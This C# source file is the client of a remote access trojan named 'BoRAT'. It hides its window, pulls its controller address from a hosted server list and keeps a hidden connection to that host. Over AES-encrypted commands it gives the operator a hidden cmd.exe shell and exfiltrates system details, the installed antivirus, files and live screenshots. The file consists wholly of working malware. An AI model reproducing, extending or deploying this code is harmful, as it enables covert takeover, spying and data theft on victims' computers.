using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using System.Management;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace BoRAT.Client
{
    public partial class frmMain : Form
    {
        private string serverList = "https://borat-admin.github.io/site/serverList.txt";

        private IPAddress _ip;
        private int _port, _delay;

        Socket clientSocket = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);

        //Cmd Shell
        bool isStarted;
        StreamWriter writeInput;
        StreamReader readOuput, errorOutput;

        //FileManager
        int fupSize = 0;
        int writeSize = 0;
        string fdl_location = "";
        string fup_location = "";
        bool isFileUpload { get; set; }
        byte[] receivedFile = new byte[1];

        //Rdp
        bool isRdpStop { get; set; }

        public frmMain()
        {
            InitializeComponent();
            GetConnectionIPs();
        }

        private void GetConnectionIPs()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    string s = client.DownloadString(serverList);

                    string[] list = s.Split(':');

                    _ip = IPAddress.Parse(list[0]);
                    _port = Convert.ToInt32(list[1]);
                    _delay = Convert.ToInt32(list[2]);

                    Console.WriteLine("\nServer responded!\nIP: " + _ip + "\nPort: " + _port + "\nDelay: " + _delay);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void FrmMain_Shown(object sender, EventArgs e)
        {
            Thread coreThread = new Thread(new ThreadStart(StartConnection));
            coreThread.Start();
        }

        private void StartConnection()
        {
            while(true)
            {
                if (clientSocket.Connected)
                {
                    Console.WriteLine("Connected to " + _ip + " on port " + _port);
                    ReceiveInfo();
                }
                else
                {
                    MakeConnection();
                }
            }
        }

        private void ReceiveInfo()
        {
            byte[] buffer = new byte[1024];
            int received = 0;

            try
            {
                received = clientSocket.Receive(buffer);
            }
            catch (SocketException)
            {
                clientSocket.Close();
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }

            if (received == 0)
                return;

            byte[] data = new byte[received];
            Array.Copy(buffer, data, received);

            if (isFileUpload)
            {
                ProcessUploadRequest(data);
            }

            if(!isFileUpload)
                ProcessNormalRequest(data);
        }

        private void MakeConnection()
        {
            while(!clientSocket.Connected)
            {
                try
                {
                    clientSocket.Connect(Dns.GetHostAddresses(Convert.ToString(_ip)), _port);

                    Thread.Sleep(_delay);
                }
                catch (SocketException)
                {
                    // Run just in case IPs change
                    GetConnectionIPs();
                };
            }
        }

        private string GetPublicIPAddress()
        {
            string pubIP = new WebClient().DownloadString("https://api.ipify.org");
            return pubIP;
        }

        private string GetUserName()
        {
            string machinName = Environment.UserName;
            return machinName;

        }

        private string GetOSName()
        {
            string osName;
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            osName = (string)key.GetValue("productName");
            return osName;
        }

        private string GetSecurityName()
        {
            string avName = "";
            try
            {
                bool windowsDefender = false;
                string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                var instances = searcher.Get();
                avName = "";
                foreach (var instance in instances)
                {
                    if (instance.GetPropertyValue("displayName").ToString().Equals("Windows Defender"))
                        windowsDefender = true;
                    if (instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
                    {
                        avName = instance.GetPropertyValue("displayName").ToString();
                    }

                }
                if (avName.Equals(string.Empty) && windowsDefender)
                    avName = "Windows Defender";
                if (avName == "") avName = "N/A";
            }
            catch (Exception)
            {
                avName = "N/A";
            }
            return avName;
        }

        private string GetTimeDate()
        {
            string TimeDate = DateTime.Now.ToString();
            return TimeDate;
        }

        private void ProcessNormalRequest(byte[] data)
        {
            string cmd = Encoding.Unicode.GetString(data);
            cmd = Decrypt(cmd);
            if (cmd.Contains("getInfo"))
            {
                string id = cmd.Split('~')[1];
                string information, pubIp, userName, osName, avName, timeDate;
                pubIp = GetPublicIPAddress();
                userName = GetUserName();
                osName = GetOSName();
                avName = GetSecurityName();
                timeDate = GetTimeDate();

                information = id + "~" + pubIp + "~" + userName +
                               "~" + osName + "~" + avName + "~" +
                               timeDate;
                string sendInfo = "infoBack|" + information;

                SendCommand(sendInfo);
            }

            else if (cmd.Equals("startCmd"))
            {
                isStarted = true;

                ProcessStartInfo pInfo = new ProcessStartInfo();
                pInfo.FileName = "cmd.exe";
                pInfo.CreateNoWindow = true;
                pInfo.UseShellExecute = false;
                pInfo.RedirectStandardInput = true;
                pInfo.RedirectStandardOutput = true;
                pInfo.RedirectStandardError = true;

                Process p = new Process();
                p.StartInfo = pInfo;
                p.Start();
                writeInput = p.StandardInput;
                readOuput = p.StandardOutput;
                errorOutput = p.StandardError;
                writeInput.AutoFlush = true;

                Thread cmdShellThread = new Thread(new ThreadStart(RunCmdShellCommands));
                cmdShellThread.Start();
            }

            else if (cmd.StartsWith("cmd§"))
            {
                if (isStarted)
                {
                    string strCmd = cmd.Split('§')[1];
                    writeInput.WriteLine(strCmd + "\r\n");
                }

                else
                {
                    SendError("cmdFaild\n");
                }
            }

            else if (cmd.Equals("drivesList"))
            {
                string dataToSend = "drivesList~";
                DriveInfo[] drivers = DriveInfo.GetDrives();

                foreach (DriveInfo d in drivers)
                {
                    try
                    {
                        if (d.IsReady)
                            dataToSend += d.Name + "|" + d.TotalSize + "\n";
                        else
                            dataToSend += d.Name + "\n";
                    }

                    catch (UnauthorizedAccessException ex)
                    {
                        SendError("FileManager Error!\n" + ex.Message);
                    }

                    catch (IOException ex)
                    {
                        SendError("FileManager Error!\n" + ex.Message);
                    }
                }

                SendCommand(dataToSend);
            }

            else if (cmd.StartsWith("enterPath~"))
            {
                bool checkPath = false;
                string path = cmd.Split('~')[1];

                if (path.Length == 3 && path.Contains(":\\"))
                    checkPath = true;
                else if (!checkPath && Directory.Exists(path))
                    checkPath = true;
                else
                {
                    SendError("Directory Not Found\n");
                    return;
                }

                Thread enterDir = new Thread(() => FM_EnterDirectory(path));
                enterDir.Start();

            }

            else if (cmd.StartsWith("backPath~"))
            {
                string path = cmd.Split('~')[1];

                if (path.Length == 3 && path.Contains(":\\"))
                {
                    SendCommand("backPath~driveList");
                }
                else
                {
                    path = new DirectoryInfo(path).Parent.FullName;
                    SendCommand("backPath~" + path);
                }

            }

            else if (cmd.StartsWith("fdl~"))
            {
                string info = cmd.Split('~')[1];
                if (File.Exists(info))
                {
                    fdl_location = info;
                    try
                    {
                        string size = new FileInfo(info).Length.ToString();
                        SendCommand("fInfo~" + size);
                    }
                    catch (Exception ex)
                    {
                        SendError("Access Error!.\n" + ex.Message + "\n");
                    }

                }
                else
                {
                    SendError("File Not Found\n");
                }
            }

            else if (cmd.Equals("fdlConfirm"))
            {
                try
                {
                    byte[] dataToSend = File.ReadAllBytes(fdl_location);
                    SendFile(dataToSend);
                }
                catch (Exception ex)
                {
                    SendError("Access Error!.\n" + ex.Message + "\n");
                }
            }

            else if (cmd.StartsWith("fup~"))
            {
                fup_location = cmd.Split('~')[1];
                if (!File.Exists(fup_location))
                {
                    fupSize = int.Parse(cmd.Split('~')[2]);
                    receivedFile = new byte[fupSize];
                    SendCommand("fupConfirm");
                    isFileUpload = true;
                }
                else
                {
                    SendError("File Already Exists.");
                }
            }

            else if (cmd.Equals("rdpStart"))
            {
                isRdpStop = false;
                Thread rdpThread = new Thread(new ThreadStart(StreamScreen));
                rdpThread.Start();
            }

            else if (cmd.Equals("rdpStop"))
                isRdpStop = true;
        }

        private void ProcessUploadRequest(byte[] data)
        {
            Buffer.BlockCopy(data, 0, receivedFile, writeSize, data.Length);

            writeSize += data.Length;

            if(receivedFile.Length==fupSize)
            {
                try
                {
                    using (FileStream fs = File.Create(fup_location))
                    {
                        byte[] info = receivedFile;
                        fs.Write(info, 0, info.Length);
                    }

                    Array.Clear(receivedFile, 0, receivedFile.Length);
                }
                catch(Exception ex)
                {
                    SendError("File Upload Error!\n" + ex.Message + "\n");
                }
                SendCommand("fileReceived");
                isFileUpload = false;
            }
        }

        private void SendCommand(string data)
        {
            try
            {
                string encrypt = Encrypt(data);
                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch(Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendFile(byte[] data)
        {
            try
            {
                clientSocket.Send(data);
            }
            catch(Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendImage(byte[] data)
        {
            try
            {
                byte[] dataToSend = new byte[data.Length + 16];
                byte[] header = Encoding.Unicode.GetBytes("rdpImage");
                Buffer.BlockCopy(header, 0, dataToSend, 0, header.Length);
                Buffer.BlockCopy(data, 0, dataToSend, header.Length, data.Length);

                clientSocket.Send(dataToSend,0,dataToSend.Length,SocketFlags.None);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }
        private void SendError(string data)
        {
            try
            {
                string error = "error~" + data;
                string encrypt = Encrypt(error);
                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch(Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }
        private void RunCmdShellCommands()
        {
            try
            {
                String tmpData = "", tmpError = "",
                    strData = "", strError = "";

                while ((tmpData = readOuput.ReadLine()) != null)
                {
                    strData += tmpData + "\r";
                    //send command
                    SendCommand("cmdout§" + strData);
                    strData = "";
                }

                while ((tmpError = errorOutput.ReadLine()) != null)
                {
                    strError += tmpError + "\r";
                    SendCommand("cmdout§" + strError);
                    strError = "";
                }
            }

            catch (Exception ex)
            {
                SendError("Cmd Error!\n" + ex.Message + "\n");
            }
        }

        private void FM_EnterDirectory(string path)
        {
            try
            {
                string[] directories = Directory.GetDirectories(path);
                string[] files = Directory.GetFiles(path);

                string dir = "";
                string file = "";

                foreach (string d in directories)
                {

                    string size = "N/A";
                    string name = d.Replace(path, "");
                    string creationTime = Directory.GetCreationTime(path).ToString();
                    string info = name + "|" + size + "|" + creationTime + "|" + d;
                    dir += info + "\n";
                }

                foreach (string f in files)
                {
                    string size = new FileInfo(f).Length.ToString();
                    string name = Path.GetFileName(f);
                    string creationTime = File.GetCreationTime(f).ToString();
                    string info = name + "|" + size.ToString() + "|" + creationTime + "|" + f;
                    file += info + "\n";
                }

                string dataToSend = "enterPath~" + dir + file;

                SendCommand(dataToSend);
            }
            catch(ArgumentNullException)
            {
                SendError("Error in EnterPath\n");
            }
            catch(System.Security.SecurityException)
            {
                SendError("Security Error in EnterPath\n");
            }
            catch(ArgumentException)
            {
                SendError("Error in EnterPath\n");
            }
            catch(UnauthorizedAccessException)
            {
                SendError("Unauthorized Error in EnterPath\n");
            }
            catch(PathTooLongException)
            {
                SendError("Error in EnterPath.\nTry Enter With Cmd Shell\n");
            }
            catch(NotSupportedException)
            {
                SendError("Unkown Error in EnterPath\n");
            }
        }

        private void StreamScreen()
        {
            while(!isRdpStop)
            {
                ImageConverter imgConverter = new ImageConverter();
                byte[] image = (byte[]) imgConverter.ConvertTo(DesktopScreen(),typeof(byte[]));
                SendImage(image);
                Thread.Sleep(1000);
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            this.Hide();
        }

        private Bitmap DesktopScreen()
        {
            try
            {
                System.Drawing.Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                System.Drawing.Bitmap screenshot = new System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                System.Drawing.Graphics graph = System.Drawing.Graphics.FromImage(screenshot);
                graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, System.Drawing.CopyPixelOperation.SourceCopy);
                return screenshot;
            }
            catch (Exception)
            {
                return null;
            }
        }
        
        public string Encrypt(string clearText)
        {
            string EncryptionKey = "BoRAT_2022";
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Rijndael encryptor = Rijndael.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "BoRAT_2022";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Rijndael encryptor = Rijndael.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                return cipherText;
            }
        }
    }
}
